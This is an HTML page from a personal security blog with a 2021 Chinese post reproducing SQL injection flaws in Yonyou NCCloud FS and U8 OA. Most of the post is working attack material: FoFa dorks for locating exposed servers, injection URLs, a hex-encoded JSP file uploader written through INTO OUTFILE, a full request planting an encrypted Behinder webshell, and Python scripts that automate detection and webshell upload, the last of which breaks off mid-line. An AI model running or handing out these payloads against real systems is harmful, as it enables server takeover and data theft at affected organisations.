@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="Kuiba's blog" type="application/atom+xml" />
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/clipboard.min.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var cb = null;
+      var els = $(".post figure.highlight");
+      if (els.length) {
+        // Enabled Hexo highlight line number.
+        $(els).each(function (i, e) {
+          // $(e).before("<button class=\"copy button\">clipboard.copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"clipboard.copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling.firstChild.firstChild.firstChild.lastChild.firstChild.firstChild;
+          }
+        });
+      } else {
+        // Disabled Hexo highlight line number.
+        els = $(".post pre code");
+        $(els).each(function (i, e) {
+          // Add button before pre, not code.
+          // $(e).parent().before("<button class=\"copy button\">clipboard.copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"clipboard.copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling;
+          }
+        });
+      }
+      cb.on("success", function (e) {
+        e.clearSelection();
+        var trigger = e.trigger;
+        // Change button text as a user tip.
+        trigger.innerHTML = "<i class=\"far fa-check-square\"></i>";
+        $(trigger).addClass("copied");
+        // Change button text back;
+        setTimeout(function () {
+          trigger.innerHTML = "<i class=\"far fa-copy\"></i>";
+          $(trigger).removeClass("copied");
+        }, 1500);
+      });
+    });
+    </script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>Yonyou-NC-injection-vulnerability | Kuiba's blog - Listen to your own voice</title>
+  <meta name="generator" content="Hexo 4.2.1"></head>
+  <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">Kuiba's blog</a></h1>
+        <h2 class="subtitle">Listen to your own voice</h2>
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%8A%80%E6%9C%AF%E6%B0%B4%E6%96%87/">技术水文</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E8%BD%AC%E8%BD%BD%E6%90%AC%E8%BF%90/">转载搬运</a></li>
+        
+        <li role="menuitem"><a href="/categories/HTB%E6%90%AC%E8%BF%90/">HTB搬运</a></li>
+        
+        <li role="menuitem"><a href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://kuibarj.top/posts/6c99903e.html">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Kuiba">
+       <meta itemprop="description" content="这是一个最好的时代，也是最坏的时代，我们亲身经历着激动人心的变革，也往往会陷入选择的迷茫。">
+       <meta itemprop="image" content="/images/avatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="Kuiba's blog">
+      </span>
+    </div>
+
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">Yonyou-NC-injection-vulnerability</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2021-07-13T00:01:34+08:00">2021-07-13 00:01:34</time></span>
+        </span>
+        
+        
+        
+        <span class="post-meta-divider divider">|</span>
+        
+        <span class="post-categories">
+          
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a></span>
+        </span>
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <script src="\assets\js\APlayer.min.js"> </script><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/12849280/1626104393184-ad5dc533-507b-4ebd-8024-fef2759d03fc.jpeg"></p>
+<a id="more"></a>
+
+<h2 id="用友-NCCloud-FS文件管理"><a href="#用友-NCCloud-FS文件管理" class="headerlink" title="用友 NCCloud FS文件管理"></a>用友 NCCloud FS文件管理</h2><p>登录页面对用户名参数没有过滤，存在SQL注入。</p>
+<h3 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a>FoFa</h3><p><code>&quot;NCCloud&quot;</code></p>
+<p>​    登录页面这样子：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994715498-c30ac368-7845-40ad-a527-70c51aec625a.png" alt="img"></p>
+<p><a href="http://xxx.xxx.xxx.xxx/fs/" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/fs/</a></p>
+<h3 id="info"><a href="#info" class="headerlink" title="info"></a>info</h3><p>登录请求包如下</p>
+<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">GET &#x2F;fs&#x2F;console?username&#x3D;test&amp;password&#x3D;DESX6dwAYlg6KF%2FlkR28c48speMx%2BQDwjnBDfMdTN%2Fk%3D HTTP&#x2F;1.1<br>Host: x.x.x.x:8081<br>User-Agent: Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:87.0; en_US) Gecko&#x2F;20100101 Firefox&#x2F;87.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>DNT: 1<br>Connection: close<br>Referer: http:&#x2F;&#x2F;www.baidu.com:7001&#x2F;<br>Cookie: JSESSIONID&#x3D;0000GZxOjXIxEy1EVEb6NAiIKVx:1bsd2unpa<br>Upgrade-Insecure-Requests: 1<br>X-Forwarded-For: 8.8.8.6<br>X-Originating-IP: 8.8.8.6<br>X-Remote-IP: 8.8.8.6<br>X-Remote-Addr: 8.8.8.6<br></code></pre></td></tr></table></figure>
+
+<p>对 <code>username</code> 进行注入</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994715634-f38d5b1b-60c9-4c6a-8389-a84cbf5d07e4.png" alt="img"></p>
+<h2 id="用友-U8-OA-test-jsp-SQL注入漏洞"><a href="#用友-U8-OA-test-jsp-SQL注入漏洞" class="headerlink" title="用友 U8 OA test.jsp SQL注入漏洞"></a>用友 U8 OA test.jsp SQL注入漏洞</h2><p>原文：<a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B" target="_blank" rel="noopener">http://wiki.peiqi.tech/PeiQi_Wiki/OA产品漏洞/用友OA/用友</a> U8 OA test.jsp SQL注入漏洞.html</p>
+<p>用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞。</p>
+<h3 id="FoFa-1"><a href="#FoFa-1" class="headerlink" title="FoFa"></a>FoFa</h3><p><code>&quot;用友U8-OA&quot;</code></p>
+<p><a href="http://x.x.x.x:8082/yyoa/index.jsp" target="_blank" rel="noopener">http://x.x.x.x:8082/yyoa/index.jsp</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994715722-3af844fa-fb4c-4094-ae0f-d8e13a0b6a88.png" alt="img"></p>
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(<span class="hljs-keyword">SELECT</span>%<span class="hljs-number">20</span><span class="hljs-keyword">MD5</span>(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994715871-6fa22b31-55d2-4647-8519-cb8618279eab.png" alt="img"></p>
+<h3 id="构造Payload获取路径"><a href="#构造Payload获取路径" class="headerlink" title="构造Payload获取路径"></a>构造Payload获取路径</h3><p><code>/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994715960-d1986d09-6959-46e9-abe9-fe3125c99eac.png" alt="img"></p>
+<p>得到物理路径 <code> E:\Program Files\UFIDA\U8_OA\mysql\bin..\</code></p>
+<p>通过 into outfile 写入文件，这里因为 jsp木马存在特殊符号，使用 hex编码上传允许文件上传的jsp文件到：<code>D:/Program Files/UFIDA/U8-OA/tomcat/webapps/yyoa/</code>，即，根目录：</p>
+<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">http:&#x2F;&#x2F;x.x.x.x&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27D:&#x2F;Program Files&#x2F;UFIDA&#x2F;U8-OA&#x2F;tomcat&#x2F;webapps&#x2F;yyoa&#x2F;3_upload.jsp%27<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994716028-803388e5-c925-4748-973d-955f7ba2c8eb.png" alt="img"></p>
+<p>如上图则上传成功，访问 360_upload.jsp 为空白不报错页面不存在就是真正上传成功。</p>
+<hr>
+<p>发送请求包上传冰蝎webshell，需要进行url编码一下。</p>
+<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">POST &#x2F;yyoa&#x2F;360_upload.jsp?f&#x3D;cdnwebshell.jsp HTTP&#x2F;1.1<br>Host: xxxxxx<br>User-Agent: Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:87.0; en_US) Gecko&#x2F;20100101 Firefox&#x2F;87.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8<br>Accept-Language: en-US,en;q&#x3D;0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>DNT: 1<br>Connection: close<br>Cookie: JSESSIONID&#x3D;1D7702B81816F505089A9BE889F796DF<br>Upgrade-Insecure-Requests: 1<br>X-Forwarded-For: 8.8.8.6<br>X-Originating-IP: 8.8.8.6<br>X-Remote-IP: 8.8.8.6<br>X-Remote-Addr: 8.8.8.6<br>Referer: http:&#x2F;&#x2F;www.baidu.com&#x2F;<br>Content-Length: 669<br><br>t&#x3D;%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994716108-1f97725c-dfa5-4d31-942e-0dda19f64e66.png" alt="img"></p>
+<h3 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h3><p><a href="http://x.x.x.//yyoa/cdnwebshell.jsp" target="_blank" rel="noopener">http://x.x.x.//yyoa/cdnwebshell.jsp</a></p>
+<p>不知道什么原因，冰蝎连接，一直提示获取秘钥失败，直接换哥斯拉，连接成功：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12849280/1620994716178-687c483c-0e36-40b2-ae05-726ebbae3ebd.png" alt="img"></p>
+<h3 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h3><p>佩奇大佬的脚本</p>
+<p>​    检测注入：</p>
+<figure class="hljs highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">title</span><span class="hljs-params">()</span>:</span><br>    print(<span class="hljs-string">'+------------------------------------------'</span>)<br>    print(<span class="hljs-string">'+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m'</span>)<br>    print(<span class="hljs-string">'+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m'</span>)<br>    print(<span class="hljs-string">'+  \033[34m公众号  : PeiQi文库                                                   \033[0m'</span>)<br>    print(<span class="hljs-string">'+  \033[34mTitle     : 用友 U8 OA test.jsp SQL注入漏洞                           \033[0m'</span>)<br>    print(<span class="hljs-string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)<br>    print(<span class="hljs-string">'+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m'</span>)<br>    print(<span class="hljs-string">'+------------------------------------------'</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_1</span><span class="hljs-params">(target_url)</span>:</span><br>    vuln_url = target_url + <span class="hljs-string">"/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20md5(1))"</span><br>    headers = &#123;<br>        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,<br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.get(url=vuln_url, headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">"c4ca4238a0b923820dcc509a6f75849b"</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> response.status_code == <span class="hljs-number">200</span>:<br>            print(<span class="hljs-string">"\033[32m[o] 目标 &#123;&#125;存在漏洞 \n[o] 响应地址: &#123;&#125; \033[0m"</span>.format(target_url, vuln_url))<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">"\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m"</span>.format(target_url))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">"\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m"</span>.format(target_url))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    title()<br>    target_url = str(input(<span class="hljs-string">"\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"</span>))<br>    POC_1(target_url)<br></code></pre></td></tr></table></figure>
+
+<p>getshell：</p>
+<figure class="hljs highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">title</span><span class="hljs-params">()</span>:</span><br>    print(<span class="hljs-string">'+------------------------------------------'</span>)<br>    print(<span class="hljs-string">'+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m'</span>)<br>    print(<span class="hljs-string">'+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m'</span>)<br>    print(<span class="hljs-string">'+  \033[34m公众号  : PeiQi文库                                                   \033[0m'</span>)<br>    print(<span class="hljs-string">'+  \033[34mVersion: 致远OA                                                   \033[0m'</span>)<br>    print(<span class="hljs-string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)<br>    print(<span class="hljs-string">'+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m'</span>)<br>    print(<span class="hljs-string">'+------------------------------------------'</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_1</span><span class="hljs-params">(target_url)</span>:</span><br>    vuln_url = target_url + <span class="hljs-string">"/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20@@basedir)"</span><br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.get(url=vuln_url, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">'序号'</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> <span class="hljs-string">"@@basedir"</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> response.status_code == <span class="hljs-number">200</span>:<br>            OA_dir = re.findall(<span class="hljs-string">r'&gt;(.*)\\UFseeyon\\'</span>, response.text)[<span class="hljs-number">0</span>]<br>            OA_dir = OA_dir[:<span class="hljs-number">2</span>] + <span class="hljs-string">'/'</span> + OA_dir[<span class="hljs-number">3</span>:]<br>            print(<span class="hljs-string">"\033[32m[o] 目标 &#123;&#125;存在漏洞, 安装路径为:&#123;&#125; \033[0m"</span>.format(target_url, OA_dir))<br>            webshell_name = <span class="hljs-string">"peiqi_upload&#123;&#125;.jsp"</span>.format(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">999</span>))<br>            OA_dir = OA_dir + <span class="hljs-string">"/UFseeyon/OA/tomcat/webapps/yyoa/&#123;&#125;"</span>.format(webshell_name)<br>            POC_2(target_url, OA_dir, webshell_name)<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">"\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m"</span>.format(target_url))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">"\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m"</span>.format(target_url), e)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_2</span><span class="hljs-params">(target_url, OA_dir, webshell_name)</span>:</span><br>    vuln_url = target_url + <span class="hljs-string">"/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27&#123;&#125;%27"</span>.format(OA_dir)<br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.get(url=vuln_url, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">'already'</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span>  response.status_code == <span class="hljs-number">200</span>:<br>            print(<span class="hljs-string">"\033[32m[o] 文件写入木马上传失败，目标已存在相同文件，请重新运行\033[0m"</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">"No Data"</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span>  response.status_code == <span class="hljs-number">200</span>:<br>            print(<span class="hljs-string">"\033[32m[o] 文件写入木马上传成功，上传路径为 &#123;&#125;\033[0m"</span>.format(OA_dir))<br>            POC_3(target_url, webshell_name)<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">"\033[31m[x] 目标 &#123;&#125; 木马上传失败 \033[0m"</span>.format(target_url))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">"\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m"</span>.format(target_url), e)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_3</span><span class="hljs-params">(target_url, webshell_name)</span>:</span><br>    rebe_webshell = <span class="hljs-string">"peiqiwebshell&#123;&#125;.jsp"</span>.format(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">999</span>))<br>    vuln_url = target_url + <span class="hljs-string">"/yyoa/&#123;&#125;?f=&#123;&#125;"</span>.format(webshell_name, rebe_webshell)<br>    data = <span 